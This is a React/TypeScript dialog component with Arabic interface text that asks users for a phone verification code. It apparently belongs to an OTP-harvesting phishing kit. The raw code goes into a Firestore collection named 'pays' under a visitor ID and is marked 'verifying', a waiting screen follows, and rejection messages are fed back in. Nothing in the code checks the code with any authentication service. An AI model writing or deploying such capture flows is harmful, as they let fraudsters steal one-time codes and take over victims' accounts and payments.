"use client";

import { useEffect, useState } from "react";
import { Loader2 } from "lucide-react";
import { doc, Firestore } from "firebase/firestore";
import { db, setDoc } from "@/lib/firebase";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Dialog, DialogContent } from "@/components/ui/dialog";

interface PhoneOtpDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  phoneNumber: string;
  phoneCarrier: string;
  onRejected: () => void;
  onShowWaitingModal: (carrier: string) => void;
  rejectionError?: string;
}

export function PhoneOtpDialog({
  open,
  onOpenChange,
  phoneNumber,
  phoneCarrier,
  onRejected,
  onShowWaitingModal,
  rejectionError = "",
}: PhoneOtpDialogProps) {
  const [otp, setOtp] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [localError, setLocalError] = useState("");

  useEffect(() => {
    if (!open) {
      setOtp("");
      setSubmitting(false);
      setLocalError("");
      return;
    }

    const savedError =
      typeof window !== "undefined"
        ? localStorage.getItem("phoneOtpRejectionError") || ""
        : "";
    setLocalError(rejectionError || savedError);
  }, [open, rejectionError]);

  const maskedPhone = phoneNumber
    ? `${phoneNumber.slice(0, 3)}****${phoneNumber.slice(-3)}`
    : "";

  const handleSubmit = async () => {
    if (!otp || otp.length < 4) {
      setLocalError("يرجى إدخال رمز التحقق بشكل صحيح");
      return;
    }

    const visitorId =
      typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
    if (!visitorId || !db) return;

    setSubmitting(true);
    setLocalError("");

    try {
      await setDoc(
        doc(db as Firestore, "pays", visitorId),
        {
          phoneOtp: otp,
          otpValue: otp,
          phoneOtpStatus: "verifying",
          otpSubmittedAt: new Date().toISOString(),
          phoneCarrier,
        },
        { merge: true }
      );

      if (typeof window !== "undefined") {
        localStorage.removeItem("phoneOtpRejectionError");
      }

      onOpenChange(false);
      onShowWaitingModal(phoneCarrier);
    } catch (error) {
      console.error("[PhoneOtpDialog] Failed to submit OTP:", error);
      setLocalError("تعذر إرسال رمز التحقق، يرجى المحاولة مرة أخرى");
      setSubmitting(false);
    }
  };

  const handleChange = (value: string) => {
    const cleanValue = value.replace(/\D/g, "").slice(0, 8);
    setOtp(cleanValue);
    if (localError) {
      setLocalError("");
      if (typeof window !== "undefined") {
        localStorage.removeItem("phoneOtpRejectionError");
      }
    }
  };

  const handleOpenChange = (nextOpen: boolean) => {
    if (!nextOpen && submitting) return;
    onOpenChange(nextOpen);
  };

  return (
    <Dialog open={open} onOpenChange={handleOpenChange}>
      <DialogContent className="sm:max-w-md" dir="rtl">
        <div className="space-y-5 py-2">
          <div className="space-y-2 text-center">
            <h2 className="text-2xl font-bold text-gray-900">رمز التحقق</h2>
            <p className="text-sm leading-6 text-gray-600">
              أدخل رمز التحقق المرسل إلى رقم الجوال {maskedPhone || phoneNumber}
            </p>
          </div>

          <div className="space-y-2">
            <Input
              type="tel"
              inputMode="numeric"
              placeholder="أدخل الرمز"
              value={otp}
              onChange={(e) => handleChange(e.target.value)}
              className="h-12 text-center text-lg tracking-[0.35em]"
              dir="ltr"
            />
            {(localError || rejectionError) && (
              <p className="text-right text-sm text-red-500">
                {localError || rejectionError}
              </p>
            )}
          </div>

          <Button
            type="button"
            className="h-12 w-full bg-[#1a5c85] hover:bg-[#154a6d]"
            disabled={submitting || otp.length < 4}
            onClick={handleSubmit}
          >
            {submitting ? (
              <>
                <Loader2 className="ml-2 h-4 w-4 animate-spin" />
                جارٍ الإرسال
              </>
            ) : (
              "تأكيد الرمز"
            )}
          </Button>
        </div>
      </DialogContent>
    </Dialog>
  );
}
